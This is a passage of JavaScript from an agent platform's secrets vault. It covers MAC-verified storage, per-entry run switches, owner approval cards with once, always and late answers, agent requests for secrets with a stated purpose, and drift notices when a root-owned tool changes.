  const ghVersionOf = (sha) => { try { const r = VR.knownToolOf('gh'); return (r && r.toolSha256 && r.toolSha256 === sha) ? (r.grammarVersion || null) : null; } catch { return null; } };
  const digestOf = (fd, st) => { const key = st ? `${st.dev}:${st.ino}:${st.size}:${st.mtimeMs}:${st.ctimeMs}` : null; if (key && digestMemo.has(key)) return digestMemo.get(key); const p = Promise.resolve(toolDigest(fd)); if (key) { if (digestMemo.size > 64) digestMemo.clear(); digestMemo.set(key, p); } return p; };
  const driftNote = (toolPath, st, sha, head, toolName) => {
    if (!sha) return;   // couldn't hash — nothing to record; the run still proceeds (the SEAL is the fence)
    try {   // round 16 (MINOR): the store is an audit aid, NEVER a gate — a read/update failure (a bad record, an unwritable file) never fails a sealed gh run
      const store = toolsLoad(), raw = store.tools[toolPath];
      const prev = (raw && typeof raw === 'object' && typeof raw.sha256 === 'string') ? raw : null;   // round 16 (MINOR): a MALFORMED record (not an object, or a non-string sha256 — a uid-writable store a prior hub or an agent could corrupt) is DISCARDED and rewritten as a fresh baseline; r15 read prev.sha256.slice on a number and THREW, failing EVERY sealed gh run forever
      const rec = { path: toolPath, dev: st ? st.dev : null, ino: st ? st.ino : null, size: st ? st.size : null, mtime: st ? Math.round(st.mtimeMs) : null, sha256: sha, version: ghVersionOf(sha), at: now() };
      if (!prev) { store.tools[toolPath] = rec; toolsSave(); return; }   // first run (or a discarded bad record): establish the baseline, no notice
      if (prev.sha256 === sha && prev.ino === rec.ino && prev.dev === rec.dev) return;   // unchanged — no record, no hash next time (the memo)
      const from = prev.version || prev.sha256.slice(0, 12), to = rec.version || sha.slice(0, 12);
      const firstNotice = prev.noticedSha !== sha; rec.noticedSha = sha;
      store.tools[toolPath] = rec; toolsSave();
      audit('vault-run-tool-drift', { tool: toolName, path: toolPath, from, to, firstNotice });   // the drift RECORD — a root-owned tool the hub trusts changed (a package roll); it RUNS
      if (firstNotice) {
        log(`vault-run-door: ${toolName} changed since the last run: ${from} → ${to} (a root-owned tool — it runs; the seal is the content fence, the digest is a drift record)`);
        if (userTodos) try { userTodos.add(VAULT_INBOX_KEY, { origin: 'vault', kind: 'notice', urgency: 'normal', by: 'agent', sessionName: 'Vault', text: `${toolName} on this machine changed: ${from} → ${to} (a root-owned tool — runs continue)`, detail: `${toolName} (${toolPath}) is sealed by root ownership, so the vault trusts whatever root installs there. Its bytes changed since the last run (${from} → ${to}) — root (a package roll or a reinstall) replaced it, and runs continue. This is a notice; nothing to do.`, i18n: { text: { key: '{tool} on this machine changed: {from} → {to} (a root-owned tool — runs continue)', params: { tool: toolName, from, to } }, detail: [{ key: '{tool} ({path}) is sealed by root ownership, so the vault trusts whatever root installs there. Its bytes changed since the last run ({from} → {to}) — root (a package roll or a reinstall) replaced it, and runs continue. This is a notice; nothing to do.', params: { tool: toolName, path: toolPath, from, to } }] } }); } catch (e) { try { log(`vault-run-door: the ${toolName} drift notice could not be filed (${(e && e.message) || e})`); } catch { } }   // round 17 (item 3): ONE For-you FYI row (no decision) per (tool, hub) until the next drift — noticedSha dedupes; the store write above already recorded the drift, so a notice failure never disturbs the record
      }
    } catch (e) { try { log(`vault-run-door: the tool drift store could not be read/updated (${(e && e.code) || e}) — the run proceeds (the seal is the content fence)`); } catch { } }
  };

  // ── THE STORE (marked by the vault) ──
  const bodyOf = (d) => JSON.stringify({ v: 1, gen: Number(d.gen) || 0, runnable: [...d.runnable].sort(), always: d.always.slice().sort((a, b) => (a.conv + a.key).localeCompare(b.conv + b.key)) });
  const okAlways = (a) => a && typeof a.conv === 'string' && typeof a.key === 'string' && a.key.startsWith(VR.SHAPE_V + ':') && (a.until === null || Number.isFinite(a.until)) && Array.isArray(a.entries);
  let lastGen = 0;   // the newest generation this hub read or wrote — an older copy is a replay (the review: a saved copy restored)
  /** The store as the vault vouches for it — null unless unlocked. Read once per unlock (the epoch), kept in memory. */
  function load() {
    if (vaultState() !== 'unlocked') return null;
    if (db && dbEpoch === vault.epoch()) return db;
    let raw = null, why = null;
    try { raw = JSON.parse(readBounded(FILE, STORE_MAX).toString('utf8')); } catch (e) { if (!(e && e.code === 'ENOENT')) why = `unreadable (${e.code || 'not JSON'})`; }
    let next = { gen: lastGen, runnable: new Set(), always: [] };
    if (raw && !why) {
      try {
        const cand = { gen: Number.isSafeInteger(raw.gen) && raw.gen >= 0 ? raw.gen : -1, runnable: new Set((Array.isArray(raw.runnable) ? raw.runnable : []).filter((id) => typeof id === 'string' && VI.parseRef(id))), always: (Array.isArray(raw.always) ? raw.always : []).filter(okAlways).map((a) => ({ conv: a.conv, key: a.key, until: a.until, entries: a.entries.filter((x) => typeof x === 'string').slice(0, 64), at: Number(a.at) || null, by: String(a.by || 'user').slice(0, 40), ...(typeof a.templateHash === 'string' ? { templateHash: a.templateHash, templateBytes: Number(a.templateBytes) || 0 } : {}) })) };
        const want = vault.macOf(MARK_LABEL, bodyOf(cand));
        const got = typeof raw.mark === 'string' && /^[0-9a-f]{64}$/.test(raw.mark) ? raw.mark : null;   // the review: a non-hex mark threw in timingSafeEqual
        if (!(want && got && cand.gen >= 0 && crypto.timingSafeEqual(Buffer.from(got, 'hex'), Buffer.from(want, 'hex')))) why = 'its mark does not verify';
        else if (cand.gen < lastGen) why = `an older copy (generation ${cand.gen} < ${lastGen}) — a replay`;
        else { next = cand; lastGen = cand.gen; }
      } catch (e) { why = `its mark could not be judged (${(e && e.code) || 'error'})`; }
    }
    if (why) { audit('vault-run-store-refused', { why: `data/${STORE_FILE}: ${why} — read as empty (every entry closed for runs, no «always» shape)` }); log(`data/${STORE_FILE}: ${why} — read as empty`); }
    db = next; dbEpoch = vault.epoch();
    return db;
  }
  function save(next0) {
    const next = { ...next0, gen: Math.max(lastGen, Number(db && db.gen) || 0) + 1 };
    const mark = vault.macOf(MARK_LABEL, bodyOf(next));
    if (!mark) return named('vault_locked');
    try { writeJsonAtomic(FILE, { ...JSON.parse(bodyOf(next)), mark }); } catch (e) { return named('failed', { why: `data/${STORE_FILE} could not be written (${e.code || e.message})` }); }
    db = next; dbEpoch = vault.epoch(); lastGen = next.gen;
    return { ok: true };
  }

  // ── THE ROWS a run may reference (each store lists its own; a value is read only for a run) ──
  const sourceOf = (store) => { try { const g = sources[store]; const s = typeof g === 'function' ? g() : null; return s && typeof s.vaultRows === 'function' ? s : null; } catch { return null; } };
  function rowOf(ref) {
    const src = sourceOf(ref.store);
    if (!src) return null;
    let rows = [];
    try { rows = src.vaultRows() || []; } catch { rows = []; }
    const raw = rows.find((r) => r && String(r.entry) === ref.entry && String(r.field) === ref.field);
    return raw ? VI.rowOf(ref.store, raw) : null;
  }
  function valueOf(ref) {
    const src = sourceOf(ref.store);
    const v = src && typeof src.vaultReveal === 'function' ? src.vaultReveal(ref.entry, ref.field) : null;
    return typeof v === 'string' ? v : null;
  }

  /** The Vault window's fact for a row: may it be opened for runs, is it open. */
  function rowFacts(row) {
    const ref = row && VI.parseRef(row.id);
    if (VR.agentScopeOf(ref)) return { can: false, open: false, own: true };   // lane vault-agent-own: its conversation runs it by construction, another may not — no switch to show
    const c = classOf(ref, row);
    const d = c.runnable ? load() : null;
    return { can: c.runnable, open: !!(c.runnable && d && d.runnable.has(row.id)) };
  }
  /** A PERSON's switch (src/routes/vault.js: people only; ON needs this page's 验证是你 window — `reauthed`). */
  function setRunnable({ id, on, reauthed = false, by = 'user' } = {}) {
    const st = vaultState();
    if (st !== 'unlocked') return named(st === 'not_set_up' ? 'vault_not_set_up' : 'vault_locked');
    const key = String(id || ''), ref = VI.parseRef(key);   // `<store>:<entry>#<field>` (src/vault-inventory.js — the row's id)
    if (!ref) return named('entry_unknown');
    const row = rowOf(ref);
    const c = classOf(ref, row);
    if (on && !c.runnable) return named('entry_has_its_own_door', { door: c.door, words: `${VR.WORDS.entry_has_its_own_door}: ${c.door}` });
    if (on && !row) return named('entry_unknown');
    if (on && !reauthed) return { ok: false, code: 'reveal_needs_password' };
    const d = load();
    const was = d.runnable.has(key);
    if (!!on === was) return { ok: true, id: key, open: was, already: true };
    const runnable = new Set(d.runnable);
    if (on) runnable.add(key); else runnable.delete(key);
    // OFF takes back every «always» and seen shape that names this entry (the review: an «always» outlived its switch)
    const always = on ? d.always : d.always.filter((a) => !a.entries.includes(key));
    if (!on) { for (const [p, x] of shortAlways) if (x.entries.includes(key)) shortAlways.delete(p); for (const [p, x] of seen) if (x.entries.includes(key)) seen.delete(p); for (const [p, x] of grants) if (x.entries.includes(key)) grants.delete(p); }   // + the grants (lane vault-manual-and-lock: OFF = closed for every conversation)
    const r = save({ runnable, always });
    if (!r.ok) return r;
    audit('vault-run-switch', { by: String(by).slice(0, 40), store: ref.store, entry: ref.entry, field: ref.field, open: !!on });
    return { ok: true, id: key, open: !!on };
  }
  /** What THIS caller may reference (vibespace-vault list): the opened rows — a reference, a label, a kind; never a value —
   *  and (lane vault-manual-and-lock) the entries a grant opened for THIS conversation (`by: 'grant'`, its purpose and end). */
  function runnableFor(caller = {}) {
    const st = vaultState();
    if (st !== 'unlocked') return named(st === 'not_set_up' ? 'vault_not_set_up' : 'vault_locked');
    const d = load(), out = [], scope = scopeOf(caller);
    const ids = new Set(d.runnable);
    if (scope) for (const g of grants.values()) if (g.conv === scope && g.until > now()) ids.add(g.entries[0]);
    const owns = (ref) => VR.ownsAgentEntry(ref, caller);
    const sec = sourceOf('secrets');   // lane vault-agent-own: + the agent entries THIS caller made (runnable by construction)
    try { for (const raw of (sec && sec.vaultRows()) || []) { const row = VI.rowOf('secrets', raw), ref = row && VI.parseRef(row.id); if (ref && owns(ref)) ids.add(row.id); } } catch { /* a source that fails lists nothing of its own */ }
    for (const id of [...ids].sort()) {
      const ref = VI.parseRef(id), row = ref && rowOf(ref);
      if (!row || !classOf(ref, row).runnable) continue;
      if (VR.agentScopeOf(ref) && !owns(ref)) continue;   // another conversation's own entry is never listed (its switch opens nothing to this one)
      const r = VR.refFor(ref.store, ref.entry, ref.field);   // the canonical spelling (the review: encodeURIComponent left !'()* raw)
      const g = d.runnable.has(id) || !scope ? null : grantOf(scope, id);
      const pv = (owns(ref) && row.provenance) || {};
      out.push({ ref: r ? r.ref : null, store: ref.store, label: row.label, kind: row.kind, field: ref.field, ...(owns(ref) ? { by: 'own', ...(pv.prov === 'minted' ? { minted: true, for: VR.forHostOf(pv.forHost) } : {}) } : g ? { by: 'grant', once: g.once, until: new Date(g.until).toISOString() } : {}) });
    }
    return { ok: true, entries: out.filter((x) => x.ref) };
  }

  // ── THE CARD (exit-proxy's ask: one per conversation × shape, 60 s, the item and the ask ONE state) ──
  const pairOf = (conv, key) => `${conv}\n${key}`;
  function settle(q, outcome, why = outcome) {
    if (!asks.has(q.askId)) return false;
    asks.delete(q.askId);
    if (byPair.get(q.pair) === q.askId) byPair.delete(q.pair);
    settled.set(q.askId, outcome === 'expired' ? 'expired' : 'settled');
    while (settled.size > SETTLED_MAX) settled.delete(settled.keys().next().value);
    try { timers.clear(q.timer); } catch { }
    if (q.todoId && userTodos) { try { const it = userTodos.get?.(q.todoId); if (it && it.status === 'open') userTodos.setStatus(q.todoId, 'done', outcome === 'expired' ? 'ask-expired' : why === 'gone' ? 'ask-over' : outcome === 'changed' ? 'ask-changed' : outcome); } catch { } }
    log(`${q.who}: the run card for \`${q.head}\` ${outcome === 'expired' ? 'got no answer in 60 s' : outcome}`);
    try { q.resolve({ outcome, askId: q.askId }); } catch { }
    return true;
  }
  function ask({ caller, run, shape, key, detail, facts = null, signal, always = null }) {
    const pair = pairOf(caller.conversationId, key);
    if (byPair.has(pair) && asks.has(byPair.get(pair))) return Promise.resolve({ outcome: 'pending', askId: byPair.get(pair) });
    if (signal && signal.aborted) return Promise.resolve({ outcome: 'gone', askId: null });
    return new Promise((resolve) => {
      const askId = randomBytes(16).toString('hex');
      const who = String(caller.name || caller.sessionKey || caller.conversationId).slice(0, 80);
      const tpls = (run.files || []).filter((f) => f.template != null && typeof f.text === 'string');   // round 17 (item 1): the template(s) the card renders IN FULL — their hash + byte count ride the «always» row for lane vault-use-grants (matching stays byte-exact via the shape key, which carries the template text)
      const templateHash = tpls.length ? crypto.createHash('sha256').update(JSON.stringify(tpls.map((f) => [f.name, f.text]))).digest('hex') : null;
      const templateBytes = tpls.length ? tpls.reduce((n, f) => n + Buffer.byteLength(f.text, 'utf8'), 0) : null;
      const q = { askId, pair, conv: caller.conversationId, sessionKey: caller.sessionKey, who, key, always: always == null ? !!shape.always : !!always, detail, entries: run.refs.map((r) => r.id), head: cmdText(run.argv).slice(0, 80), facts, askedAt: now(), todoId: null, timer: null, resolve, templateHash, templateBytes };
      asks.set(askId, q); byPair.set(pair, askId);
      if (userTodos) {
        try {
          const it = userTodos.add(caller.sessionKey || 'vault', {
            origin: 'vault', urgency: 'urgent', kind: 'action', by: 'agent', sessionName: who, expiresAt: q.askedAt + VR.ASK_TTL_MS,
            text: `${who} wants to run a command with a stored secret`,
            detail,   // THE WHOLE RUN as the owner approves it — the command (references, never a value), the secrets, how, the hosts, the folder
            i18n: { text: { key: '{who} wants to run a command with a stored secret', params: { who } } },
            action: { type: 'vault-run-ask', askId, always: q.always, tool: String(shape.name || '').slice(0, 40) },   // = ACTION_TYPE (spelled for the approval census's grep)
            ...(facts ? { facts } : {}),   // lane vault-agent-own r20: the structured card (lane wake-approve-card's user-todos.js keeps `facts` and renders it with t() keys; this tree's store drops it until then, and the record keeps today's `detail`)
          });
          q.todoId = it && it.id;
        } catch (e) {
          asks.delete(askId); byPair.delete(pair);
          log(`${who}: the run card could not be filed in For you: ${e.message}`);
          resolve({ outcome: 'unfiled', askId: null });
          return;
        }
      }
      q.timer = timers.set(() => goLate(q), VR.ASK_TTL_MS);   // lane vault-agent-own r20b (the owner's ruling A): at 60 s the COMMAND is refused ask_expired, but the CARD stays as `late` for 24 h — a late «allow once» still counts
      q.timer?.unref?.();
      if (signal && typeof signal.addEventListener === 'function') signal.addEventListener('abort', () => settle(q, 'gone', 'gone'), { once: true });
    });
  }
  /** A PERSON's answer (src/routes/vault.js: people only; «always» needs this page's 验证是你 window — `reauthed`). */
  function answer(askId, { answer: a, ttl = VR.ALWAYS_DEFAULT, reauthed = false, by = 'user' } = {}) {
    const id = String(askId || '');
    const q = asks.get(id);
    if (!q) { const lq = lateAsks.get(id); if (lq) return answerLate(lq, { answer: a, reauthed, by }); return { ok: false, code: settled.get(id) === 'expired' ? 'ask_expired' : settled.has(id) ? 'ask_settled' : 'ask_unknown' }; }
    if (now() - q.askedAt >= VR.ASK_TTL_MS) { goLate(q); const lq = lateAsks.get(id); if (lq) return answerLate(lq, { answer: a, reauthed, by }); return { ok: false, code: 'ask_expired' }; }   // lane vault-agent-own r20b: a live card answered in the 60 s→go-late race is answered as the late card it just became
    if (!['once', 'always', 'deny'].includes(a)) return { ok: false, code: 'bad_answer' };
    if (a === 'deny') { settle(q, 'denied', 'answered'); return { ok: true, outcome: 'denied' }; }   // `outcome` (the route lays the vault's facts — its `state` — over the answer)
    if (a === 'always' && !q.always) return { ok: false, code: 'always_not_offered' };
    if (a === 'always' && !Object.prototype.hasOwnProperty.call(VR.ALWAYS_TTLS, ttl)) return { ok: false, code: 'bad_answer' };
    if (a === 'always' && !reauthed) return { ok: false, code: 'reveal_needs_password' };
    if (vaultState() !== 'unlocked') { settle(q, 'vault_locked'); return { ok: false, code: 'vault_locked' }; }
    // THE BELT (approval census b): an allow is for what the owner was SHOWN — the item still open, still this ask's, its detail the very text
    if (q.todoId && userTodos && typeof userTodos.get === 'function') {
      let it = null; try { it = userTodos.get(q.todoId); } catch { }
      const shown = !!(it && it.status === 'open' && it.action && it.action.type === ACTION_TYPE && it.action.askId === q.askId && String(it.detail || '') === q.detail);
      if (!shown) { settle(q, 'changed', 'item-changed'); return { ok: false, code: 'ask_changed' }; }
    }
    if (!liveOf(q.conv)) { settle(q, 'denied', 'gone'); return { ok: false, code: 'conversation_gone' }; }
    if (a === 'always') {
      const ms = VR.ALWAYS_TTLS[ttl], until = ms == null ? null : now() + ms;
      if (ttl === '8h') shortAlways.set(q.pair, { until, entries: q.entries });
      else {
        const d = load();
        if (!d) { settle(q, 'vault_locked'); return { ok: false, code: 'vault_locked' }; }
        const r = save({ runnable: d.runnable, always: [...d.always.filter((x) => !(x.conv === q.conv && x.key === q.key)), { conv: q.conv, key: q.key, until, entries: q.entries, at: now(), by: String(by).slice(0, 40), ...(q.templateHash ? { templateHash: q.templateHash, templateBytes: q.templateBytes } : {}) }] });
        if (!r.ok) { settle(q, 'denied', r.code); return r; }
      }
      audit('vault-run-always', { by: String(by).slice(0, 40), conv: q.conv, shapeId: shapeIdOf(q.key), ttl, until });
    }
    seen.set(q.pair, { at: now(), entries: q.entries });
    settle(q, a === 'always' ? 'always' : 'allowed', 'answered');
    return { ok: true, outcome: a === 'always' ? 'always' : 'allowed', ...(a === 'always' ? { ttl } : {}) };
  }
  // THE ITEM AND THE ASK ARE ONE STATE: the item leaving 'open' by another door settles the ask refused; a reopen of an ask that is over goes back to done
  if (userTodos && typeof userTodos.onStatus === 'function') {
    userTodos.onStatus((it, { status, by }) => {
      if (!it || !it.action || (it.action.type !== ACTION_TYPE && it.action.type !== REQUEST_TYPE)) return;
      const req = it.action.type === REQUEST_TYPE;
      const q = (req ? requests : asks).get(String(it.action.askId || ''));
      if (status === 'open') { if (!q) { try { userTodos.setStatus(it.id, 'done', 'ask-over'); } catch { } } return; }
      if (req) { if (q && q.todoId === it.id) settleRequest(q, 'denied', `item-${String(status)}-by-${String(by || 'user')}`); return; }   // a request's card closed elsewhere = not granted
      if (!q || q.todoId !== it.id) { const lq = lateAsks.get(String(it.action.askId || '')); if (lq && lq.todoId === it.id) removeLate(lq, null); return; }   // lane vault-agent-own r20b: a late card closed elsewhere — drop the in-memory late ask (the store already settled the item)
      settle(q, by === 'expired' ? 'expired' : 'denied', by === 'expired' ? 'timeout' : `item-${String(status)}-by-${String(by || 'user')}`);
    });
  }
  // ── LATE CARDS (lane vault-agent-own r20b; the owner's ruling A: a late «allow once» still counts) ──
  function lateItemFact(outcome, by) { return { outcome, late: true, decidedBy: by && by !== 'vault' ? by : null, decidedAt: now() }; }
  function reshapeLate(todoId, askId, { lateAt, shapeId, until }) {
    if (!(todoId && userTodos && typeof userTodos.reshapeItems === 'function')) return;
    try { userTodos.reshapeItems((it) => { if (it.id !== todoId || !it.action || it.action.type !== ACTION_TYPE || it.action.askId !== askId) return false; if (!(it.status === 'open' || it.resolvedBy === 'expired')) return false; it.status = 'open'; it.resolvedAt = null; it.resolvedBy = null; it.action = { ...it.action, late: true, lateAt, shapeId }; it.expiresAt = until; return true; }); } catch { }   // the item stays OPEN as a late card; it reclaims itself if a store-expiry sweep settled it in the 60 s race (never an owner dismissal — that settled the q and cleared this timer first)
  }
  /** The 60 s lapsed with no answer: the agent's run is refused ask_expired (the COMMAND settles), but the For-you item / the chat decision row stays OPEN as a `late` card the owner may still allow (one run) or deny for 24 h. */
  function goLate(q) {
    if (!asks.has(q.askId)) return;
    asks.delete(q.askId); if (byPair.get(q.pair) === q.askId) byPair.delete(q.pair);
    try { timers.clear(q.timer); } catch { }
    const lateAt = now(), until = lateAt + LATE_TTL_MS, shapeId = shapeIdOf(q.key);
    const lq = { askId: q.askId, pair: q.pair, conv: q.conv, key: q.key, entries: q.entries, who: q.who, head: q.head, detail: q.detail, todoId: q.todoId, shapeId, lateAt, until, timer: null };
    lateAsks.set(q.askId, lq); latePair.set(q.pair, q.askId);
    lq.timer = timers.set(() => removeLate(lq, 'expired', 'vault'), LATE_TTL_MS); lq.timer?.unref?.();
    reshapeLate(q.todoId, q.askId, { lateAt, shapeId, until });
    log(`${q.who}: the run card for \`${q.head}\` got no answer in 60 s — kept as a late card (allow = one run) for 24 h`);
    try { q.resolve({ outcome: 'expired', askId: q.askId }); } catch { }
  }
  function removeLate(lq, outcome, by = 'user') {
    if (!lateAsks.has(lq.askId)) return false;
    lateAsks.delete(lq.askId); if (latePair.get(lq.pair) === lq.askId) latePair.delete(lq.pair);
    try { timers.clear(lq.timer); } catch { }
    if (outcome && lq.todoId && userTodos) { try { const it = userTodos.get?.(lq.todoId); if (it && it.status === 'open') { if (typeof userTodos.resolveAnswered === 'function') userTodos.resolveAnswered([lq.todoId], by, lateItemFact(outcome, by)); else userTodos.setStatus(lq.todoId, 'done', outcome); } } catch { } }
    return true;
  }
  function restartLate(lq) {   // a second run of the same shape while the late card is open: the ONE card is asked again, its 24 h countdown restarts (no second card)
    lq.lateAt = now(); lq.until = lq.lateAt + LATE_TTL_MS;
    try { timers.clear(lq.timer); } catch { }
    lq.timer = timers.set(() => removeLate(lq, 'expired', 'vault'), LATE_TTL_MS); lq.timer?.unref?.();
    reshapeLate(lq.todoId, lq.askId, { lateAt: lq.lateAt, shapeId: lq.shapeId, until: lq.until });
  }
  function consumeLate(pair) { lateOnce.delete(pair); }
  /** The owner answers a LATE card (src/routes/vault.js, people only). `once` writes a one-run pass the next identical run consumes (no reauth — «allow once» never needed it, and a late card offers no «always»); `deny` settles it; a locked vault is vault_locked as today. */
  function answerLate(lq, { answer: a, reauthed = false, by = 'user' }) {
    if (!['once', 'deny'].includes(a)) return { ok: false, code: a === 'always' ? 'always_not_offered' : 'bad_answer' };
    if (vaultState() !== 'unlocked') { removeLate(lq, 'vault_locked', 'vault'); return { ok: false, code: 'vault_locked' }; }
    if (lq.todoId && userTodos && typeof userTodos.get === 'function') { let it = null; try { it = userTodos.get(lq.todoId); } catch { } if (!(it && it.status === 'open' && it.action && it.action.type === ACTION_TYPE && it.action.askId === lq.askId && it.action.late && String(it.detail || '') === String(lq.detail || ''))) { removeLate(lq, null); return { ok: false, code: 'ask_changed' }; } }   // the belt: still the open late card for this ask, its detail the very text shown
    if (a === 'deny') { removeLate(lq, 'denied', by); return { ok: true, outcome: 'denied' }; }
    if (lq.pair && lq.key) lateOnce.set(lq.pair, { until: now() + LATE_TTL_MS, entries: lq.entries || [], askId: lq.askId });   // the one-run pass; a reregistered-after-restart lq has no key (its shape is gone) so no pass is minted — the next run shows a fresh card (fails safe, never over-permits)
    removeLate(lq, 'late-allowed', by);
    audit('vault-run-late-answer', { by: String(by).slice(0, 40), conv: lq.conv, shapeId: lq.shapeId, outcome: 'allowed', minted: !!(lq.pair && lq.key) });
    return { ok: true, outcome: 'late-allowed', ...(lq.pair && lq.key ? {} : { note: 'the card survived a restart; the next run shows a fresh card' }) };
  }
  function reregisterLate(it) {   // boot reconcile keeps a late card: re-register a minimal in-memory ask so the owner may still deny it or it expires at 24 h (a late allow cannot mint a pass without the shape key, which died with the old process — it fails safe)
    const askId = String(it.action.askId || ''); if (!askId || lateAsks.has(askId)) return;
    const until = (typeof it.expiresAt === 'number' && it.expiresAt > now()) ? it.expiresAt : now() + LATE_TTL_MS;
    const lq = { askId, pair: null, conv: null, key: null, entries: [], who: it.sessionName || '', head: '', detail: String(it.detail || ''), todoId: it.id, shapeId: String(it.action.shapeId || ''), lateAt: Number(it.action.lateAt) || now(), until, timer: null };
    lateAsks.set(askId, lq);
    lq.timer = timers.set(() => removeLate(lq, 'expired', 'vault'), Math.max(1, until - now())); lq.timer?.unref?.();
  }
  /** Boot: a LIVE card a previous process filed can never be answered (the run it held died with it); a LATE card is KEPT (the owner may still allow one run). */
  function reconcile() {
    if (!userTodos) return 0;
    let n = 0;
    try { for (const it of (userTodos.snapshot?.() || {}).open || []) if (it && it.action) {
      if (it.action.type === ACTION_TYPE && !asks.has(it.action.askId)) { if (it.action.late) reregisterLate(it); else { try { userTodos.setStatus(it.id, 'done', 'ask-expired'); n++; } catch { } } }
      else if (it.action.type === REQUEST_TYPE && !requests.has(it.action.askId)) { try { userTodos.setStatus(it.id, 'done', 'vault_locked'); n++; } catch { } }
    } } catch (e) { log(`run card reconcile failed: ${e.message}`); }
    try { for (const it of (userTodos.snapshot?.() || {}).open || []) if (it && it.sessionKey === VAULT_INBOX_KEY && !it.action && it.text === ASKING_TEXT && it.id !== asking.id) userTodos.setStatus(it.id, 'done', 'vault'); } catch { }   // B-4934: a previous process's «N are asking» (its requests died with it)
    return n;
  }
  const shapeIdOf = (key) => crypto.createHash('sha256').update(String(key)).digest('hex').slice(0, 16);

  // ── THE REQUEST AND ITS GRANT (lane vault-manual-and-lock — design q-043 D4: `vibespace-vault request <entry> --for "<why>"`) ──
  /** THIS conversation as the use law spells it (its `conv` — the session's registered id; a mint's scope) — the run's own
   *  card / «always» keep the conversation id they always had. */
  const scopeOf = (caller) => String((caller && (caller.scope || caller.conversationId)) || '');
  /** A live grant of `id` to `scope` — or null (an expired one goes). */
  function grantOf(scope, id) {
    const p = pairOf(scope, id), g = grants.get(p);
    if (!g) return null;
    if (!(g.until > now())) { grants.delete(p); return null; }
    return g;
  }
  const requestWords = (r) => [
    { key: 'Secret: {label} — {ref}', params: { label: r.label, ref: r.ref } },
    { key: 'What for, in the agent\'s words: {purpose}', params: { purpose: r.purpose } },
    { key: 'Allow once: its next run with this secret (within 8 hours). For 8 hours: every run with it. Both ask for the second password, as «Usable by agent runs» does; a new kind of command still shows you its card first, and locking the vault ends the grant.' },
    { key: 'To let every conversation use it, turn on «Usable by agent runs» on its row in ⚙ System ▸ Vault….' },
  ];
  const fill = (l) => l.key.replace(/\{(\w+)\}/g, (m, k) => (l.params && l.params[k] != null ? String(l.params[k]) : m));
  function settleRequest(q, outcome, why = outcome) {
    if (!requests.has(q.askId)) return false;
    requests.delete(q.askId);
    if (reqByPair.get(q.pair) === q.askId) reqByPair.delete(q.pair);
    settled.set(q.askId, 'settled');
    while (settled.size > SETTLED_MAX) settled.delete(settled.keys().next().value);
    if (q.todoId && userTodos) { try { const it = userTodos.get?.(q.todoId); if (it && it.status === 'open') userTodos.setStatus(q.todoId, 'done', outcome === 'vault_locked' ? 'vault_locked' : outcome === 'changed' ? 'ask-changed' : outcome); } catch { } }
    if (outcome === 'denied') { reqQuiet.set(q.pair, now() + REQUEST_QUIET_MS); for (const [p, u] of reqQuiet) if (!(u > now())) reqQuiet.delete(p); }
    log(`${q.who}: the request for ${q.ref} ${outcome}${why !== outcome ? ` (${why})` : ''}`);
    askingLine();
    return true;
  }
  /** B-4934: the owner's tray says how many conversations hold open requests once there are more than 8 — ONE Vault notice,
   *  re-worded in place as the count moves (its English text is the store's dedupe key; N rides its words), closed at 8 or
   *  fewer. Set aside by the owner, it stays quiet until the count falls to 8 or fewer. */
  function askingLine() {
    if (!userTodos || asking.batch) return;
    const n = new Set([...requests.values()].map((x) => x.scope)).size;
    const it = asking.id ? (() => { try { return userTodos.get(asking.id); } catch { return null; } })() : null;
    if (n <= ASKING_LINE_OVER) {
      if (it && it.status === 'open') { try { userTodos.setStatus(it.id, 'done', 'vault'); } catch { } }
      asking = { id: null, n: 0, quiet: false, batch: false };
      return;
    }
    if (it && it.status !== 'open' && it.resolvedBy !== 'vault') asking.quiet = true;   // dismissed / done by a person
    if (asking.quiet || (it && it.status === 'open' && asking.n === n)) return;
    try {
      const r = userTodos.add(VAULT_INBOX_KEY, { origin: 'vault', kind: 'notice', urgency: 'normal', by: 'agent', sessionName: 'Vault', text: ASKING_TEXT,
        detail: ASKING_DETAIL, i18n: { text: { key: ASKING_KEY, params: { n } }, detail: [{ key: ASKING_DETAIL }] } });
      if (r && r.id) asking = { ...asking, id: r.id, n };
    } catch (e) { log(`the «${n} conversations are asking» line could not be filed: ${e.message}`); }
  }
  /**
   * An AGENT asks the owner for an entry, with its purpose. `caller` as `run` reads it; `entry` = a `vault://` reference;
   * `purpose` = one line. → { ok: true, askId } (ONE For-you ask filed — nothing waits on it) | { ok: true, already: 'open' |
   * 'granted', … } | a named refusal.
   */
  function request({ caller = {}, entry = '', purpose = '' } = {}) {
    if (caller.job) return named('job_no_use');
    const scope = scopeOf(caller);
    if (!scope || !caller.conversationId) return named('unauthorized');
    const st = vaultState();
    if (st === 'not_set_up') return named('vault_not_set_up');
    if (st !== 'unlocked') { try { vault.blocked(VB.actorName(caller.name, 'a conversation'), 'vibespace-vault request'); } catch { } return named('vault_locked'); }
    if (caller.remote) return named('device_road_later');
    const raw = String(entry == null ? '' : entry).trim(), why0 = String(purpose == null ? '' : purpose);
    if (raw.length > 1024 || why0.length > 4 * PURPOSE_MAX) return named('request_too_large');
    if (HC.hiddenCharsOf(raw, { max: 1 }).length || HC.hiddenCharsOf(why0, { max: 1 }).length) return named('hidden_chars');
    const ref = VR.parseRef(raw);
    if (!ref) return named('bad_reference');
    const why = why0.replace(/\s+/g, ' ').trim();
    if (!why) return named('purpose_required');
    if (why.length > PURPOSE_MAX) return named('purpose_too_long');
    const said = SS.redactSecrets(why).text;   // the purpose lands in the owner's tray and the audit: a value pasted into it is «redacted»
    const row = rowOf(ref), c = classOf(ref, row);
    if (!c.runnable) return named('entry_has_its_own_door', { ref: ref.ref, door: c.door, words: `${VR.WORDS.entry_has_its_own_door}: ${c.door}` });
    if (!row) return named('entry_unknown', { ref: ref.ref });
    const sc = VR.agentScopeOf(ref);
    if (sc && VR.ownsAgentEntry(ref, caller)) { const pv = row.provenance || {}; return { ok: true, already: 'own', ref: ref.ref, ...(pv.prov === 'minted' ? { minted: true, for: VR.forHostOf(pv.forHost) } : {}) }; }   // lane vault-agent-own: what it stored itself is its own to use — nothing to ask (round 2: a MINTED one still asks off its host)
    if (sc) return named('use_not_granted', { ref: ref.ref });   // another conversation's own entry is its own
    const pair = pairOf(scope, ref.id);
    const g = grantOf(scope, ref.id);
    if (g) return { ok: true, already: 'granted', ref: ref.ref, once: g.once, until: g.until };
    const d = load();
    if (d && d.runnable.has(ref.id)) return { ok: true, already: 'open', ref: ref.ref };
    const up = reqByPair.get(pair);
    if (up && requests.has(up)) return named('request_pending', { ref: ref.ref });
